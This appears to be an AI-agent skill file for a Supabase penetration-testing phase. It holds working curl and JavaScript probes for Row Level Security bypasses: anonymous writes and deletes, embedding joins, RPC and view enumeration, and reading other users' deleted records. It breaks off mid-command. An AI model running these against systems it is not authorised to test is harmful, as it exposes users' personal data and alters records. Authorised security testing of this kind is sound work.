---
name: scan-fase-20
description: Execute FASE 20 - Advanced RLS Bypass Techniques for Supabase. Deep exploration of Row Level Security vulnerabilities using reverse engineering, threat modeling, and behavioral analysis. Tests role-based access, JOIN bypasses, SECURITY DEFINER function exploitation, view leakage, temporal table bypasses, policy logic analysis, trigger chain exploitation, aggregate side-channels, PostgREST-specific attacks, and RLS condition manipulation. Adapts dynamically to each Supabase schema and policy configuration. Invoke with /scan-fase-20 {url}.
---

# FASE 20: Advanced RLS Bypass Techniques (Supabase)

Deep security analysis of Supabase Row Level Security (RLS) implementation using advanced reverse engineering, threat modeling, and behavioral analysis techniques. This phase goes beyond basic RLS testing to discover subtle policy weaknesses, logic flaws, and bypass vectors.

**Target**: Supabase applications with RLS enabled (detected in FASE 0)

---

## Prerequisites

- FASE 0 completed (Supabase backend confirmed)
- FASE 1-3 completed (reconnaissance, schema discovery, basic RLS testing)
- FASE 8 completed (JWT analysis - understand token structure)
- Supabase URL and Anon Key extracted
- Schema information from FASE 2 (tables, columns, relationships)
- Previous RLS test results from FASE 3 (know which tables have RLS)

---

## CRITICAL: Adaptive Deep Analysis Mindset

**This skill uses advanced techniques to discover RLS bypasses that basic testing misses. The checklist is a STARTING POINT for deep exploration.**

### Core Principles

1. **RLS is only as strong as its weakest policy** - One misconfigured policy exposes the entire table
2. **Policy logic can be reverse engineered** - Extract and analyze every policy condition
3. **PostgreSQL internals matter** - Understanding execution order reveals bypass opportunities
4. **Context propagation is fragile** - auth.uid(), auth.jwt() can be manipulated in edge cases
5. **Indirect access paths exist** - JOINs, views, functions, triggers can bypass direct RLS

### When You Find Something NOT in the Checklist

```yaml
unexpected_rls_bypass:
  type: "{bypass_type}"
  table: "{table_name}"
  description: "Detailed description of the bypass mechanism"

  root_cause:
    policy_name: "{policy if applicable}"
    weakness: "Logical flaw / missing condition / edge case"

  exploitation:
    steps:
      - "Step 1: Identify the weakness"
      - "Step 2: Craft the bypass query"
      - "Step 3: Extract unauthorized data"

  impact:
    records_exposed: {number}
    data_sensitivity: "{PII|financial|credentials|etc}"
    gdpr_fine_estimate: "€{amount}"

  poc_curl: |
    curl -s "https://xxx.supabase.co/rest/v1/..." \
      -H "apikey: ..." -H "Authorization: Bearer ..."

  severity: "CRITICAL"
  added_to_report: true
```

### Adaptive Testing Flow

| What You Observe | What To Try Next |
|------------------|------------------|
| RLS blocks direct SELECT | Try JOIN with public table, aggregate functions, views |
| Policy uses auth.uid() | Test NULL handling, type coercion, JWT manipulation |
| SECURITY DEFINER function exists | Test if it bypasses RLS, check input validation |
| Soft deletes implemented | Query deleted records, check if RLS applies |
| Foreign keys present | Exploit cascading relationships for data access |

---

## Phase Overview

### Core Checklist (20.1-20.5) - From CHECKLIST.md
| Phase | Test | Criticality |
|-------|------|-------------|
| 20.1 | Role Testing (anon vs authenticated) | HIGH |
| 20.2 | JOIN-based Bypass | CRITICAL |
| 20.3 | Function Exploitation (SECURITY DEFINER) | CRITICAL |
| 20.4 | View Exploitation | HIGH |
| 20.5 | Temporal Table Bypass (soft deletes) | HIGH |

### Extended Analysis (20.6-20.10) - Deep Vulnerability Exploration
| Phase | Test | Technique | Criticality |
|-------|------|-----------|-------------|
| 20.6 | Policy Logic Reverse Engineering | Static Analysis | CRITICAL |
| 20.7 | Trigger/Function Chain Analysis | Execution Flow | CRITICAL |
| 20.9 | Aggregate Function Bypass | Side-Channel | HIGH |
| 20.10 | PostgREST-Specific Bypass | Protocol Analysis | CRITICAL |
| 20.11 | RLS Policy Condition Manipulation | Edge Case Testing | CRITICAL |

---

## Phase 20.1: Role Testing

### Objective
Test access differences between PostgreSQL roles (anon, authenticated) and identify policies that don't properly distinguish between them.

### Understanding Supabase Roles

```yaml
# Supabase uses PostgreSQL roles for RLS context:
roles:
  anon:
    description: "Unauthenticated users (no JWT or invalid JWT)"
    jwt_claim: "role: anon"
    typical_access: "Public data only"

  authenticated:
    description: "Logged-in users with valid JWT"
    jwt_claim: "role: authenticated"
    typical_access: "Own data + shared data"

  service_role:
    description: "Backend/admin access - BYPASSES RLS"
    jwt_claim: "role: service_role"
    typical_access: "Everything (dangerous if exposed)"
```

### Execution

```bash
SUPABASE_URL="https://{project}.supabase.co"
ANON_KEY="eyJ..."
ACCESS_TOKEN="eyJ..."  # From authenticated user

# === Test 1: Compare anon vs authenticated access ===
echo "=== 20.1.1: Anon role access ==="
curl -s "$SUPABASE_URL/rest/v1/profiles?select=*" \
  -H "apikey: $ANON_KEY" | jq 'length'

echo "=== 20.1.2: Authenticated role access ==="
curl -s "$SUPABASE_URL/rest/v1/profiles?select=*" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'

# === Test 2: Test each discovered table with both roles ===
TABLES=("profiles" "users" "orders" "documents" "settings")

for TABLE in "${TABLES[@]}"; do
  echo "=== Testing table: $TABLE ==="

  # Anon access
  ANON_COUNT=$(curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=id" \
    -H "apikey: $ANON_KEY" | jq 'length' 2>/dev/null || echo "error")

  # Authenticated access
  AUTH_COUNT=$(curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=id" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length' 2>/dev/null || echo "error")

  echo "  Anon: $ANON_COUNT records | Authenticated: $AUTH_COUNT records"

  # Check for unexpected access
  if [ "$ANON_COUNT" != "0" ] && [ "$ANON_COUNT" != "error" ] && [ "$ANON_COUNT" != "[]" ]; then
    echo "  WARNING: Anon has access to $TABLE!"
  fi
done

# === Test 3: Check if policies differentiate roles properly ===
echo "=== 20.1.3: Role differentiation check ==="

# Test INSERT as anon (should fail on most tables)
curl -s -X POST "$SUPABASE_URL/rest/v1/profiles" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{"id": "test-anon-insert", "name": "Test"}' | jq '.code // .message // .'

# Test UPDATE as anon
curl -s -X PATCH "$SUPABASE_URL/rest/v1/profiles?id=eq.some-id" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"name": "Hacked"}' | jq '.code // .message // .'

# Test DELETE as anon
curl -s -X DELETE "$SUPABASE_URL/rest/v1/profiles?id=eq.some-id" \
  -H "apikey: $ANON_KEY" | jq '.code // .message // .'
```

### Playwright Role Testing

```javascript
// Test role context in browser environment
const page = await browser.newPage();
await page.goto(targetUrl);

// Extract current role from JWT
const roleInfo = await page.evaluate(() => {
  const storage = Object.keys(localStorage).find(k => k.includes('supabase'));
  if (storage) {
    const data = JSON.parse(localStorage.getItem(storage));
    const token = data?.access_token;
    if (token) {
      const payload = JSON.parse(atob(token.split('.')[1]));
      return { role: payload.role, aud: payload.aud, exp: payload.exp };
    }
  }
  return { role: 'anon', reason: 'No token found' };
});

console.log('Current role context:', roleInfo);
```

### Output

```yaml
phase_20_1:
  status: completed

  role_testing:
    tables_tested: {number}

    anon_access:
      tables_accessible: [{list}]
      records_exposed: {total}
      operations_allowed: ["{SELECT|INSERT|UPDATE|DELETE}"]

    authenticated_access:
      tables_accessible: [{list}]
      records_exposed: {total}
      operations_allowed: ["{operations}"]

    role_differentiation:
      properly_configured: [{tables with correct role separation}]
      misconfigured:
        - table: "{table_name}"
          issue: "Anon can SELECT all records"
          expected: "No anon access"
          severity: "CRITICAL"

    findings:
      - table: "{table_name}"
        vulnerability: "RLS allows anon SELECT"
        records_exposed: {number}
        severity: "CRITICAL"
        poc: |
          curl "$SUPABASE_URL/rest/v1/{table}?select=*" -H "apikey: $ANON_KEY"

  severity: "{highest severity}"
```

---

## Phase 20.2: JOIN-based Bypass

### Objective
Test if RLS policies can be bypassed by JOINing protected tables with public or less-protected tables.

### Understanding JOIN Bypass

```yaml
# The vulnerability:
# - Table A has strict RLS (only own records)
# - Table B has weak/no RLS (public access)
# - Table A has foreign key to Table B
# - JOIN query may expose Table A data through Table B relationship

# Example:
# profiles (strict RLS) -> orders (weak RLS) -> order_items (no RLS)
# Attacker queries order_items with embedded profiles data
```

### Execution

```bash
# === Test 1: Identify table relationships from FASE 2 ===
echo "=== 20.2.1: Mapping table relationships ==="

# Use GraphQL to discover relationships
curl -s -X POST "$SUPABASE_URL/graphql/v1" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { types { name fields { name type { name ofType { name } } } } } }"
  }' | jq '.data.__schema.types[] | select(.fields != null) | {name, fields: [.fields[] | select(.type.name != null or .type.ofType != null) | .name]}'

# === Test 2: PostgREST resource embedding (JOIN via API) ===
echo "=== 20.2.2: Testing resource embedding ==="

# Pattern: select=*,related_table(*)
# This performs a JOIN internally

# Test 1: Embed protected table in public query
curl -s "$SUPABASE_URL/rest/v1/orders?select=*,profiles(*)" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.[0:3]'

# Test 2: Reverse embedding
curl -s "$SUPABASE_URL/rest/v1/profiles?select=*,orders(*)" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.[0:3]'

# Test 3: Deep embedding (3+ levels)
curl -s "$SUPABASE_URL/rest/v1/organizations?select=*,members(*,profiles(*))" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.[0:3]'

# === Test 3: Embedding with filters on related table ===
echo "=== 20.2.3: Filtered embedding bypass ==="

# Try to access other users' data via embedding filter
OTHER_USER_ID="other-user-uuid"

curl -s "$SUPABASE_URL/rest/v1/orders?select=*,profiles!inner(*)&profiles.id=eq.$OTHER_USER_ID" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

# === Test 4: GraphQL JOIN bypass ===
echo "=== 20.2.4: GraphQL relationship traversal ==="

curl -s -X POST "$SUPABASE_URL/graphql/v1" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{
      ordersCollection {
        edges {
          node {
            id
            total
            user: profiles {
              id
              email
              full_name
            }
          }
        }
      }
    }"
  }' | jq '.data.ordersCollection.edges[0:3]'
```

### Advanced JOIN Bypass Techniques

```bash
# === Test 5: Lateral JOIN simulation via RPC ===
echo "=== 20.2.5: RPC-based JOIN bypass ==="

# Check if any RPC function performs JOINs internally
# These functions may not respect RLS of joined tables

RPC_FUNCTIONS=$(curl -s "$SUPABASE_URL/rest/v1/rpc/" \
  -H "apikey: $ANON_KEY" 2>/dev/null || echo "[]")

echo "Available RPC functions: $RPC_FUNCTIONS"

# Test common report/export functions that aggregate data
curl -s -X POST "$SUPABASE_URL/rest/v1/rpc/get_user_report" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_id": "'$OTHER_USER_ID'"}'

# === Test 6: Many-to-many relationship bypass ===
echo "=== 20.2.6: Junction table exploitation ==="

# Junction tables often have weaker RLS
# Pattern: users <-> user_roles <-> roles

curl -s "$SUPABASE_URL/rest/v1/user_roles?select=*,users(*),roles(*)" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.[0:5]'
```

### Output

```yaml
phase_20_2:
  status: completed

  join_bypass_tests:
    relationships_discovered: {number}
    embeddings_tested: {number}

    vulnerable:
      - pattern: "orders?select=*,profiles(*)"
        vulnerability: "Can access other users' profiles via order embedding"
        rls_on_profiles: "Strict (user_id = auth.uid())"
        rls_on_orders: "Weak (allows all authenticated)"
        data_exposed:
          table: "profiles"
          fields: ["email", "phone", "address"]
          records: {number}
        severity: "CRITICAL"
        poc: |
          curl "$SUPABASE_URL/rest/v1/orders?select=*,profiles(*)" \
            -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN"

      - pattern: "GraphQL relationship traversal"
        vulnerability: "User data exposed via orders→profiles relationship"
        severity: "CRITICAL"

    secure:
      - pattern: "profiles?select=*,orders(*)"
        result: "RLS correctly applied - only own orders returned"

    junction_tables:
      tested: [{list}]
      vulnerable: [{list with details}]

  severity: "CRITICAL"
```

---

## Phase 20.3: Function Exploitation (SECURITY DEFINER)

### Objective
Identify and exploit PostgreSQL functions with SECURITY DEFINER that may bypass RLS when called.

### Understanding SECURITY DEFINER

```yaml
# PostgreSQL function security contexts:

SECURITY INVOKER (default):
  - Function runs with CALLER's permissions
  - RLS policies apply based on caller's role
  - Safe for RLS

SECURITY DEFINER:
  - Function runs with OWNER's permissions (usually postgres/service_role)
  - RLS policies may be BYPASSED
  - Dangerous if function exposes data or accepts user input

# Common vulnerable patterns:
# - Report generation functions
# - Admin utilities exposed to users
# - Data export functions
# - Aggregation functions
```

### Execution

```bash
# === Test 1: Discover RPC functions ===
echo "=== 20.3.1: Listing available RPC functions ==="

# PostgREST exposes functions in public schema
# Try calling non-existent function to trigger error with function list
curl -s -X POST "$SUPABASE_URL/rest/v1/rpc/__list_functions__" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{}' | jq '.'

# Common Supabase/app functions to test
RPC_FUNCTIONS=(
  "get_user_stats"
  "get_dashboard_data"
  "export_data"
  "generate_report"
  "get_all_users"
  "admin_get_users"
  "search_users"
  "get_user_by_email"
  "bulk_update"
  "sync_data"
)

for FUNC in "${RPC_FUNCTIONS[@]}"; do
  echo "=== Testing RPC: $FUNC ==="
  RESPONSE=$(curl -s -X POST "$SUPABASE_URL/rest/v1/rpc/$FUNC" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{}')

  # Check if function exists and returns data
  if echo "$RESPONSE" | grep -qv "function.*does not exist"; then
    echo "FOUND: $FUNC"
    echo "Response: ${RESPONSE:0:200}..."
  fi
done

# === Test 2: Test functions with user-controlled parameters ===
echo "=== 20.3.2: Testing function parameters ==="

# Common parameter injection patterns
curl -s -X POST "$SUPABASE_URL/rest/v1/rpc/get_user_data" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_id": "'$OTHER_USER_ID'"}'

curl -s -X POST "$SUPABASE_URL/rest/v1/rpc/search_users" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"search_term": "%", "limit": 1000}'

# === Test 3: Test functions as anon (should mostly fail) ===
echo "=== 20.3.3: Anon access to functions ==="

for FUNC in "${RPC_FUNCTIONS[@]}"; do
  RESPONSE=$(curl -s -w "%{http_code}" -o /tmp/rpc_response.json \
    -X POST "$SUPABASE_URL/rest/v1/rpc/$FUNC" \
    -H "apikey: $ANON_KEY" \
    -H "Content-Type: application/json" \
    -d '{}')

  if [ "$RESPONSE" = "200" ]; then
    echo "VULNERABLE: $FUNC accessible as anon!"
    cat /tmp/rpc_response.json | head -c 200
  fi
done
```

### SECURITY DEFINER Detection Heuristics

```bash
# === Test 4: Detect SECURITY DEFINER behavior ===
echo "=== 20.3.4: SECURITY DEFINER detection ==="

# Heuristic: If function returns data that RLS should block,
# it's likely SECURITY DEFINER

# Get my user ID
MY_USER_ID=$(curl -s "$SUPABASE_URL/rest/v1/profiles?select=id&limit=1" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq -r '.[0].id')

# Direct query (should only return own data due to RLS)
DIRECT_COUNT=$(curl -s "$SUPABASE_URL/rest/v1/profiles?select=id" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length')

# Via function (if returns more, function bypasses RLS)
FUNC_RESPONSE=$(curl -s -X POST "$SUPABASE_URL/rest/v1/rpc/get_all_profiles" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}')

FUNC_COUNT=$(echo "$FUNC_RESPONSE" | jq 'length' 2>/dev/null || echo "0")

echo "Direct query: $DIRECT_COUNT records"
echo "Via function: $FUNC_COUNT records"

if [ "$FUNC_COUNT" -gt "$DIRECT_COUNT" ]; then
  echo "CRITICAL: Function bypasses RLS! ($FUNC_COUNT > $DIRECT_COUNT)"
fi
```

### Output

```yaml
phase_20_3:
  status: completed

  function_exploitation:
    functions_discovered: {number}
    functions_tested: {number}

    vulnerable:
      - function: "get_all_profiles"
        security_context: "SECURITY DEFINER (inferred)"
        vulnerability: "Returns all profiles regardless of RLS"
        direct_query_records: 1
        function_query_records: 150
        data_exposed:
          fields: ["id", "email", "phone"]
          total_records: 150
        severity: "CRITICAL"
        poc: |
          curl -X POST "$SUPABASE_URL/rest/v1/rpc/get_all_profiles" \
            -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN"

      - function: "search_users"
        vulnerability: "Accepts wildcard search, returns all users"
        parameter: "search_term"
        payload: '{"search_term": "%"}'
        severity: "CRITICAL"

    anon_accessible:
      - function: "{func_name}"
        expected: "Requires authentication"
        actual: "Accessible to anon"
        severity: "HIGH"

    secure:
      - function: "{func_name}"
        result: "Properly respects RLS"

  severity: "CRITICAL"
```

---

## Phase 20.4: View Exploitation

### Objective
Identify views that may expose data differently than their underlying tables due to RLS policy gaps.

### Understanding View Security

```yaml
# Views in PostgreSQL can have different RLS behavior:

# Scenario 1: View without SECURITY INVOKER
# - Created by admin/superuser
# - May bypass RLS of underlying tables
# - Common in reporting views

# Scenario 2: View with joins
# - Joins multiple tables
# - RLS may not apply consistently across all tables

# Scenario 3: Materialized views
# - Pre-computed data
# - RLS doesn't apply to cached data
# - Refresh may expose data
```

### Execution

```bash
# === Test 1: Discover views via REST API ===
echo "=== 20.4.1: View discovery ==="

# Views are exposed like tables in PostgREST
# Test common view naming patterns
VIEW_PATTERNS=(
  "v_users"
  "vw_users"
  "users_view"
  "user_summary"
  "dashboard_stats"
  "report_data"
  "all_users"
  "public_profiles"
  "user_details"
  "admin_view"
)

for VIEW in "${VIEW_PATTERNS[@]}"; do
  RESPONSE=$(curl -s -w "%{http_code}" -o /tmp/view_response.json \
    "$SUPABASE_URL/rest/v1/$VIEW?select=*&limit=5" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN")

  if [ "$RESPONSE" = "200" ]; then
    RECORDS=$(cat /tmp/view_response.json | jq 'length')
    echo "FOUND VIEW: $VIEW ($RECORDS records)"
    cat /tmp/view_response.json | jq '.[0]' 2>/dev/null
  fi
done

# === Test 2: Compare view vs table access ===
echo "=== 20.4.2: View vs table comparison ==="

# If view returns more data than table, view bypasses RLS
TABLE="profiles"
VIEW="v_profiles"  # or whatever view was discovered

TABLE_COUNT=$(curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=id" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length')

VIEW_COUNT=$(curl -s "$SUPABASE_URL/rest/v1/$VIEW?select=id" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length' 2>/dev/null || echo "N/A")

echo "Table $TABLE: $TABLE_COUNT records"
echo "View $VIEW: $VIEW_COUNT records"

if [ "$VIEW_COUNT" != "N/A" ] && [ "$VIEW_COUNT" -gt "$TABLE_COUNT" ]; then
  echo "CRITICAL: View exposes more data than table!"
fi

# === Test 3: Test views as anon ===
echo "=== 20.4.3: Anon access to views ==="

for VIEW in "${VIEW_PATTERNS[@]}"; do
  RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
    "$SUPABASE_URL/rest/v1/$VIEW?select=*&limit=1" \
    -H "apikey: $ANON_KEY")

  if [ "$RESPONSE" = "200" ]; then
    echo "WARNING: View $VIEW accessible to anon!"
  fi
done

# === Test 4: GraphQL view access ===
echo "=== 20.4.4: GraphQL view exposure ==="

curl -s -X POST "$SUPABASE_URL/graphql/v1" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { types { name kind } } }"
  }' | jq '.data.__schema.types[] | select(.name | startswith("v_") or contains("view") or contains("View"))'
```

### Output

```yaml
phase_20_4:
  status: completed

  view_exploitation:
    views_discovered: {number}
    views_tested: {number}

    vulnerable:
      - view: "v_user_summary"
        underlying_tables: ["profiles", "orders"]
        vulnerability: "View exposes all user data regardless of RLS"
        table_access_records: 1
        view_access_records: 150
        data_exposed:
          fields: ["user_id", "email", "total_orders", "revenue"]
        severity: "CRITICAL"
        poc: |
          curl "$SUPABASE_URL/rest/v1/v_user_summary?select=*" \
            -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN"

      - view: "dashboard_stats"
        vulnerability: "Accessible to anon, exposes aggregated data"
        severity: "HIGH"

    secure:
      - view: "{view_name}"
        result: "RLS properly applied"

  severity: "CRITICAL"
```

---

## Phase 20.5: Temporal Table Bypass (Soft Deletes)

### Objective
Test if RLS policies properly handle soft-deleted records and historical data.

### Understanding Temporal Data Vulnerabilities

```yaml
# Soft delete pattern:
# - Records have "deleted_at" timestamp instead of being deleted
# - RLS policies often forget to filter deleted records
# - Deleted records may contain sensitive historical data

# Common vulnerable patterns:
# - Policy: user_id = auth.uid()
# - Missing: AND deleted_at IS NULL
# - Result: Can access "deleted" records of other users

# Audit/history tables:
# - Often store copies of data changes
# - May have weaker or no RLS
# - Expose historical values (old passwords, old emails)
```

### Execution

```bash
# === Test 1: Check for soft delete columns ===
echo "=== 20.5.1: Soft delete column discovery ==="

# Common soft delete column names
SOFT_DELETE_COLUMNS=("deleted_at" "is_deleted" "deleted" "archived_at" "is_archived")

for TABLE in profiles users orders documents; do
  # Try to select with soft delete columns
  for COL in "${SOFT_DELETE_COLUMNS[@]}"; do
    RESPONSE=$(curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=$COL&limit=1" \
      -H "apikey: $ANON_KEY" \
      -H "Authorization: Bearer $ACCESS_TOKEN")

    if echo "$RESPONSE" | grep -qv "column.*does not exist"; then
      echo "FOUND: $TABLE has column $COL"
    fi
  done
done

# === Test 2: Query deleted records ===
echo "=== 20.5.2: Accessing deleted records ==="

# Try to access soft-deleted records
curl -s "$SUPABASE_URL/rest/v1/profiles?select=*&deleted_at=not.is.null" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'

curl -s "$SUPABASE_URL/rest/v1/profiles?select=*&is_deleted=eq.true" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'

# === Test 3: Check if deleted records of OTHER users are accessible ===
echo "=== 20.5.3: Cross-user deleted record access ==="

# This should return 0 if RLS is correct
# If it returns records, deleted data of other users is exposed
DELETED_OTHER=$(curl -s "$SUPABASE_URL/rest/v1/profiles?select=*&deleted_at=not.is.null&user_id=neq.$MY_USER_ID" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN")

DELETED_COUNT=$(echo "$DELETED_OTHER" | jq 'length' 2>/dev/null || echo "0")

if [ "$DELETED_COUNT" -gt "0" ]; then
  echo "CRITICAL: Can access deleted records of other users!"
  echo "$DELETED_OTHER" | jq '.[0:3]'
fi

# === Test 4: Check for audit/history tables ===
echo "=== 20.5.4: Audit table discovery ==="

AUDIT_TABLES=(
  "audit_log"
  "audit_logs"
  "history"
  "profiles_history"
  "users_history"
  "change_log"
  "activity_log"
)

for TABLE in "${AUDIT_TABLES[@]}"; do
  RESPONSE=$(curl -s -w "%{http_code}" -o /tmp/audit_response.json \
    "$SUPABASE_URL/rest/v1/$TABLE?select=*&limit=5" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN")

  if [ "$RESPONSE" = "200" ]; then
    RECORDS=$(cat /tmp/audit_response.json | jq 'length')
    echo "FOUND AUDIT TABLE: $TABLE ($RECORDS records)"

    # Check if contains sensitive fields
    cat /tmp/audit_response.json | jq '.[0] | keys'
  fi
done

# === Test 5: Version/snapshot tables ===
echo "=== 20.5.5: Version table access ==="

curl -s "$SUPABASE_URL/rest/v1/document_versions?select=*" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.[0:3]'
```

### Output

```yaml
phase_20_5:
  status: completed

  temporal_bypass:
    soft_delete_columns_found:
      - table: "profiles"
        column: "deleted_at"
      - table: "orders"
        column: "is_deleted"

    deleted_record_access:
      own_deleted_accessible: {true|false}
      other_users_deleted_accessible: {true|false}  # CRITICAL if true
      total_deleted_records_exposed: {number}

    vulnerable:
      - table: "profiles"
        vulnerability: "Can access deleted records of other users"
        records_exposed: 25
        data_includes: ["email", "phone", "address"]
        severity: "CRITICAL"
        poc: |
          curl "$SUPABASE_URL/rest/v1/profiles?select=*&deleted_at=not.is.null" \
            -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN"

    audit_tables:
      discovered: [{list}]
      accessible: [{list}]
      data_exposed:
        - table: "audit_log"
          fields: ["old_email", "old_password_hash", "changed_by"]
          severity: "CRITICAL"

    secure:
      - table: "{table_name}"
        result: "RLS filters deleted records correctly"

  severity: "CRITICAL"
```

---

## Phase 20.6: Policy Logic Reverse Engineering (Extended)

### Objective
Extract, analyze, and reverse engineer RLS policy logic to identify subtle weaknesses, missing conditions, and exploitable edge cases.

### Understanding Policy Analysis

```yaml
# RLS policies are SQL expressions that determine row access
# By reverse engineering the logic, we can identify:
# - Missing ownership checks
# - Incomplete role validation
# - Logic flaws (OR vs AND)
# - Exploitable NULL handling
# - Type coercion vulnerabilities

# Policy components:
# - USING clause: Controls SELECT, UPDATE, DELETE (row visibility)
# - WITH CHECK clause: Controls INSERT, UPDATE (new row validation)
```

### Execution

```bash
# === Test 1: Infer policy logic via query probing ===
echo "=== 20.6.1: Policy logic inference ==="

# Test different filter combinations to infer policy structure

TABLE="profiles"

# Test 1: Basic user_id check
echo "Test: user_id filter"
curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=id&user_id=eq.$MY_USER_ID" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'

curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=id&user_id=eq.$OTHER_USER_ID" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'

# Test 2: NULL user_id (edge case)
echo "Test: NULL user_id"
curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=id&user_id=is.null" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'

# Test 3: org_id / team_id patterns (shared access)
echo "Test: Organization-based access"
curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=id,org_id" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'group_by(.org_id) | map({org_id: .[0].org_id, count: length})'

# Test 4: Role-based patterns
echo "Test: Role field access"
curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=id,role&role=eq.admin" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'

# === Test 2: Error message analysis ===
echo "=== 20.6.2: Error message policy hints ==="

# Verbose errors may reveal policy structure
curl -s -X PATCH "$SUPABASE_URL/rest/v1/$TABLE?id=eq.$OTHER_USER_ID" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{"name": "test"}' | jq '.message // .hint // .'

# === Test 3: Policy condition enumeration ===
echo "=== 20.6.3: Condition enumeration ==="

# Test common policy condition patterns
CONDITIONS=(
  "is_public=eq.true"
  "visibility=eq.public"
  "status=eq.active"
  "is_active=eq.true"
  "role=eq.member"
  "access_level=gte.1"
)

for COND in "${CONDITIONS[@]}"; do
  RESPONSE=$(curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=id&$COND" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN")

  COUNT=$(echo "$RESPONSE" | jq 'length' 2>/dev/null || echo "error")

  if [ "$COUNT" != "0" ] && [ "$COUNT" != "error" ]; then
    echo "POLICY CONDITION FOUND: $COND returns $COUNT records"
  fi
done
```

### Advanced Policy Analysis

```bash
# === Test 4: JWT claim-based policy probing ===
echo "=== 20.6.4: JWT claim policy analysis ==="

# Decode current JWT to understand claims
JWT_PAYLOAD=$(echo "$ACCESS_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null)
echo "Current JWT claims: $JWT_PAYLOAD"

# Common JWT-based policy patterns to test:
# - auth.uid() = user_id column
# - auth.jwt()->>'email' = email column
# - auth.jwt()->'app_metadata'->>'role' = role check
# - auth.jwt()->'user_metadata'->>'org_id' = organization check

# Test if email claim affects access
MY_EMAIL=$(echo "$JWT_PAYLOAD" | jq -r '.email')
curl -s "$SUPABASE_URL/rest/v1/profiles?select=*&email=eq.$MY_EMAIL" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'

# === Test 5: Boolean logic exploitation ===
echo "=== 20.6.5: Boolean logic flaws ==="

# Policies with OR conditions may be exploitable
# Example: (user_id = auth.uid() OR is_public = true)
# If is_public can be set by user, attacker gains access

# Test public flag manipulation
curl -s -X PATCH "$SUPABASE_URL/rest/v1/$TABLE?id=eq.$MY_RECORD_ID" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
